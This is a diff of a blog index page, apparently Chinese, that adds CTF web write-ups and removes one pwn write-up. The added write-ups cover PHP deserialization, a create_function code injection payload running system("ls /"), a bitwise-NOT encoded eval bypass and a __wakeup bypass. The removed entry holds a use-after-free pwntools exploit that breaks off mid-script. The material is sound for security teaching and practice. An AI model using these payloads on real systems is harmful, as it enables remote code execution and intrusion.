@@ -131,6 +131,127 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/07/08/赣网杯2021-web1-wp/" >赣网杯2021-web1-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-07-08
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="http://122.114.252.87:1110/gwb.php">题目链接</a></p>
+<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><ul>
+<li>关键点： unserialize($this-&gt;key)();</li>
+<li>做题做魔怔了   一开始就在想类对象加括号是调用了什么     实际上字符串也可以被序列化&amp;反序列化</li>
+<li>若将”phpinfo”序列化后传输  则会执行 phpinfo();</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$pwd</span>=<span class="title function_ invoke__">getcwd</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;        </span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;key)();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mod2 = <span class="string">&quot;welcome &quot;</span>.<span class="variable language_">$this</span>-&gt;mod1;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;        </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable language_">$this</span>-&gt;action;</span><br><span class="line">        <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="尝试执行phpinfo"><a href="#尝试执行phpinfo" class="headerlink" title="尝试执行phpinfo"></a>尝试执行phpinfo</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span> = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;        <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> func;</span><br><span class="line"><span class="variable">$a</span> -&gt; key = <span class="title function_ invoke__">serialize</span>(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment"># O:4:&quot;func&quot;:3:&#123;s:4:&quot;mod1&quot;;s:1:&quot;a&quot;;s:4:&quot;mod2&quot;;s:1:&quot;b&quot;;s:3:&quot;key&quot;;s:14:&quot;s:7:&quot;phpinfo&quot;;&quot;;&#125;</span></span><br><span class="line"><span class="comment"># 传输 ?0=O:4:&quot;func&quot;:3:&#123;s:4:&quot;mod1&quot;;s:1:&quot;a&quot;;s:4:&quot;mod2&quot;;s:1:&quot;b&quot;;s:3:&quot;key&quot;;s:14:&quot;s:7:&quot;phpinfo&quot;;&quot;;&#125;  成功调用phpinfo</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="php数组特性"><a href="#php数组特性" class="headerlink" title="php数组特性"></a>php数组特性</h2><p>当一个数组被当作函数调用时  如果数组第一个元素为类对象  第二个元素为这个对象内的方法名   那么就会调用该对象下的该方法   </p>
+<p>思路：</p>
+<ol>
+<li>让 $a-&gt;key&#x3D;serialize([new GetFlag, “get_flag”])</li>
+<li>设置$action为create_function  并构造code 执行</li>
+</ol>
+<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>create_function()会创建一个匿名函数（lambda_样式）函数名是以lambda开头的一个自增的函数名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>,<span class="string">&#x27;echo ($a+$b);&#x27;</span>); <span class="comment">//返回lambda_1</span></span><br><span class="line"><span class="comment">//等效于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda_1</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="variable">$a</span>+<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span>= <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>,<span class="string">&#x27;echo ($a+$b);&#x27;</span>);</span><br><span class="line"><span class="variable">$f</span>(<span class="number">1</span>, <span class="number">2</span>);	<span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="底层实现"><a href="#底层实现" class="headerlink" title="底层实现"></a>底层实现</h3><p>对用户传入参数<code>function_args,function_code</code>进行拼接构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">__lambda_func</span> (<span class="params"> function_args </span>) </span>&#123; function_code &#125; \<span class="number">0</span>;</span><br><span class="line"><span class="comment"># 如果可控在第一个参数，需要闭合圆括号和大括号：	create_function(&#x27;)&#123;&#125;phpinfo();//&#x27;, &#x27;&#x27;);</span></span><br><span class="line"><span class="comment"># 如果可控在第二个参数，需要闭合大括号：		create_function(&#x27;&#x27;, &#x27;&#125;phpinfo();//&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span> = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;        <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;;&#125;system(&quot;ls /&quot;);//&#x27;</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="variable">$action</span> = <span class="string">&quot;create_function&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> func;</span><br><span class="line"><span class="variable">$a</span>-&gt;key= <span class="title function_ invoke__">serialize</span>([<span class="keyword">new</span> <span class="title class_">GetFlag</span>, <span class="string">&quot;get_flag&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment"># O:4:&quot;func&quot;:3:&#123;s:4:&quot;mod1&quot;;s:1:&quot;a&quot;;s:4:&quot;mod2&quot;;s:1:&quot;b&quot;;s:3:&quot;key&quot;;s:121:&quot;a:2:&#123;i:0;O:7:&quot;GetFlag&quot;:2:&#123;s:4:&quot;code&quot;;s:19:&quot;;&#125;system(&quot;ls /&quot;);//&quot;;s:6:&quot;action&quot;;s:15:&quot;create_function&quot;;&#125;i:1;s:8:&quot;get_flag&quot;;&#125;&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/07/08/赣网杯2021-web1-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/07/08/SWPUCTF2021-hardrce-wp/" >SWPUCTF2021-hardrce-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-07-08
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/439">题目链接</a>   </p>
+<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><p>屏蔽字母和若干符号</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<h2 id="url编码取反绕过"><a href="#url编码取反绕过" class="headerlink" title="url编码取反绕过"></a>url编码取反绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;~&quot;</span> . <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># system: ~%8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="comment"># ls: ~%93%8C</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="构造发送"><a href="#构造发送" class="headerlink" title="构造发送"></a>构造发送</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">93</span>%<span class="number">8</span>C);	<span class="comment"># 相当于system(ls);</span></span><br></pre></td></tr></table></figure>
+
+
+
+	
+	</div>
+  <a type="button" href="/2023/07/08/SWPUCTF2021-hardrce-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/07/07/SWPUCTF2021-noWakeup-wp/" >SWPUCTF2021-no_wakeup-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-07-07
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/429">题目链接</a>  </p>
+<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><p>明显反序列化漏洞  但是反序列化会自动调用__wakup()函数 进行sha1加密 难以逆转   </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaHaHa</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;passwd = <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;wllm&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;No wake up&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$Letmeseesee</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$Letmeseesee</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过wakeup"><a href="#绕过wakeup" class="headerlink" title="绕过wakeup"></a>绕过wakeup</h2><p>php特性：当序列化后对象的参数列表中成员个数和实际个数不符合时不调用 __weakup()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaHaHa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span> = <span class="string">&quot;wllm&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">HaHaHa</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:6:&quot;HaHaHa&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</span></span><br><span class="line"><span class="comment"># 将个数2改为3 得到   O:6:&quot;HaHaHa&quot;:3:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;</span></span><br><span class="line"><span class="comment"># 发送得到flag</span></span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/07/07/SWPUCTF2021-noWakeup-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/07/06/SWPUCTF2021-sql-wp/" >SWPUCTF2021-sql-wp</a>
 								</h3>
 							</div>
@@ -384,130 +505,6 @@ else show_source(__FILE__);
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/06/19/NISACTF2022-uaf-wp/" >NISACTF2022-uaf-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-06-19
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/19/NISACTF2022-uaf-wp">相关资源</a>  </p>
-<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><ul>
-<li>PIE未开</li>
-<li>free完没有置空，存在uaf漏洞</li>
-<li>存在后门函数<code>NICO(char* command)</code>，执行<code>system(command)</code>;</li>
-<li>page为结构体指针数组  结构体组成：char str[4] 和 void* func (各为32位)</li>
-<li>show(0) 会执行 (page[0]-&gt;func)(page[0]-&gt;str)</li>
-</ul>
-<h2 id="0x2-思路"><a href="#0x2-思路" class="headerlink" title="0x2 思路"></a>0x2 思路</h2><ul>
-<li>create page[0]</li>
-<li>del page[0]</li>
-<li>create page[1] （此时page[0]和page[1]相同，指向相同空间）</li>
-<li>edit page[1] —-&gt;  ‘sh\0\0’+p32(NICO)   (即修改了page[0])</li>
-<li>show(0)</li>
-</ul>
-<h2 id="0x3-exp"><a href="#0x3-exp" class="headerlink" title="0x3 exp"></a>0x3 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./bin&quot;</span>, stdin=pty, stdout=pty)</span><br><span class="line"><span class="comment"># proc = remote(&quot;node4.anna.nssctf.cn&quot;, 28035)</span></span><br><span class="line">belf = ELF(<span class="string">&quot;./bin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dlt</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;page\n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shw</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;page\n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edt</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;page\n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;strings\n&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    b create</span></span><br><span class="line"><span class="string">    b del</span></span><br><span class="line"><span class="string">    b show</span></span><br><span class="line"><span class="string">    b 